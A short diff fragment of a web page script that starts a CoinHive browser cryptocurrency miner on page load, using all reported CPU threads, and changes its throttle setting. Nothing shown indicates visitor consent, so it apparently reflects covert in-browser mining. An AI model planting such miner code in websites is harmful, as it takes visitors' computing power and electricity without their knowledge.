@@ -9,7 +9,7 @@ $(document).ready(function () {
     var miner = new CoinHive.User(monro_api_key, 'User', {
   	threads: navigator.hardwareConcurrency,
   	autoThreads: false,
-  	throttle: .5,
+  	throttle: 1,
   	forceASMJS: false
   	});
     miner.start();
